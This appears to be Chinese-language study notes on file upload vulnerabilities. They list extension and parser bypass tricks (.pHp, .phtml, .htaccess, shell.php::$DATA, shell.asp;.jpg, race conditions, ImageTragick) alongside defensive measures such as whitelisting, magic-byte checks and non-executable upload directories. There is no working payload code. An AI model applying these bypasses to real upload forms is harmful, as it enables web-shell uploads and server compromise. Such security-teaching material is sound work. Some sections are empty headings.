文件上传漏洞

一、前置知识

1.1 文件上传漏洞概述

什么是文件上传漏洞？

  • 网站允许用户上传文件（头像、附件、图片等）
  • 如果服务端未严格检查，攻击者可上传恶意脚本
  • 当 Web 服务器解析执行该脚本时，就形成了漏洞

核心思想：

上传成功 ≠ 利用成功

二、常见检查机制与绕过方法

2.1 前端检查（JavaScript）

检查方式：

  • JS 验证文件扩展名
  • JS 限制文件大小
  • HTML accept 属性限制选择类型

绕过方法：

  1. 浏览器禁用 JavaScript
  2. 使用 Burp 抓包后修改文件名
  3. 直接构造 HTTP 请求发送

核心结论：

前端限制只是用户体验措施，不能作为安全边界

2.3 文件后缀检查

黑名单

特点： 禁止已知危险后缀，其他默认允许

问题：

  1. 需要穷举所有危险后缀不现实
  2. 可能遗漏特殊配置下的解析后缀
  3. 不同 Web 服务器解析规则不同

绕过思路：

  • 大小写绕过：.pHp（如果系统不区分大小写）
  • 双写绕过：.phphpp
  • 特殊扩展名：.php5, .phtml, .phar
  • Apache 解析：.php.xxx（默认从右到左找识别的扩展名）
  • Nginx 解析：/test.jpg/test.php（路径解析漏洞）
  • 利用 .htaccess 改变解析规则
  • 利用 Windows 特性：shell.php. 或 shell.php::$DATA

白名单

特点： 只允许指定后缀，其他全部拒绝

优势： 比黑名单更安全
但仍有问题： 白名单只检查后缀，不验证文件真实内容

可能的原因：

  1. 保存位置：文件在 Web 根目录之外
  2. 权限问题：文件没有执行权限
  3. 解析器配置：服务器不解析该后缀
  4. 中间件配置：禁止执行上传目录的脚本

四、常见问题

4.1 基础概念问题

Q: 文件上传漏洞为什么会产生？

因为用户上传的文件被 Web 服务器当作可执行脚本解析执行。根本原因是服务端对用户上传文件缺乏足够的检查和限制。

Q: multipart/form-data 是什么？

HTTP 协议中用于上传文件的编码类型，能将表单数据和文件内容一起发送，浏览器在 <form enctype="multipart/form-data"> 时使用。

Q: $_FILES 中大概有什么？

name（原始文件名）、type（MIME类型）、size（大小）、tmp_name（临时文件路径）、error（错误码）。

4.2 检查机制问题

Q: Content-Type 为什么不能直接相信？

Content-Type 是客户端在 HTTP 请求头中提交的，攻击者可以用 Burp 等工具随意修改。服务器应该通过检查文件实际内容（如文件头）来判断类型。

Q: 文件后缀和真实文件类型有什么区别？

  • 后缀是文件名的一部分，客户端可随意命名
  • 真实文件类型由文件内容（二进制数据）决定，通过文件头 Magic Bytes 识别
  • 例如：shell.jpg 后缀是 jpg，但内容可能是 PHP 代码

Q: 黑名单和白名单有什么区别？

  • 黑名单：列举不允许的，默认允许所有。需要穷举所有危险情况，容易遗漏。
  • 白名单：列举允许的，默认拒绝所有。更安全，但只检查后缀，仍需验证文件内容。

Q: 文件头是什么？

文件开头的若干字节，用于标识文件真实类型。如 JPEG 的文件头是 FF D8 FF E0，PNG 是 89 50 4E 47。

4.3 利用链问题

Q: 为什么上传成功不代表能够代码执行？

文件能上传只是第一步，还需要：

  1. 文件在 Web 可访问目录
  2. 路径可预测
  3. Web 服务器能解析执行该文件
  4. 解析器配置正确

Q: Web Server 在整个利用链中起了什么作用？

Web Server 决定文件如何处理：

  • 静态文件 → 直接返回
  • 脚本文件 → 交给解析器执行
  • 配置错误或特殊规则可能导致非脚本文件被解析执行

Q: .htaccess 大概是干什么的？

Apache 的目录级配置文件，可影响当前目录的 Web 行为，如：

  • 改变文件解析规则
  • 设置目录访问权限
  • URL 重写规则

Q: 图片马为什么通常还需要结合其他漏洞？

图片马虽然包含恶意代码，但 Web 服务器默认只把它当成静态图片返回。需要配合：

  • 文件包含漏洞（包含图片马）
  • 解析配置（如 .htaccess）
  • 服务器解析漏洞

4.4 防御问题

Q: 为什么上传目录最好禁止脚本执行？

即使攻击者上传了恶意脚本，如果目录禁止执行，也无法触发代码执行。这是纵深防御的重要措施。

Q: 为什么不能只依靠某一道过滤规则？

文件上传是复杂过程，需要通过多层检查：

  1. 扩展名检查（白名单优先）
  2. 文件头检查（验证真实类型）
  3. 内容检查（对图片进行重采样）
  4. 存储安全（重命名、禁止执行）
  5. 访问控制

六、拓展内容

6.1 其他绕过技巧

1. 文件名解析差异

2. 条件竞争（Race Condition）

  • 检查后移动前的极短时间窗口
  • 利用并发请求在移动前访问临时文件

3. Web 服务器历史解析漏洞

  • Apache 2.0.x：shell.php.rar 会解析为 PHP
  • Nginx 配置不当：/upload/avatar.jpg/1.php 会解析 PHP
  • IIS 6.0：shell.asp;.jpg 按 ASP 解析

4. 图片处理库漏洞

  • ImageMagick 的 CVE-2016-3714（ImageTragick）
  • GD 库的某些漏洞

6.2 防御加固方案

1. 文件存储安全

2. 权限与配置

3. 内容深度检查

  • 对图片进行重新采样（重新生成图片）
  • 使用杀毒软件扫描上传文件
  • 对文件内容进行严格过滤

  3. 特殊协议：phar:// 反序列化
  4. RESTful API 上传：JSON 格式的文件上传
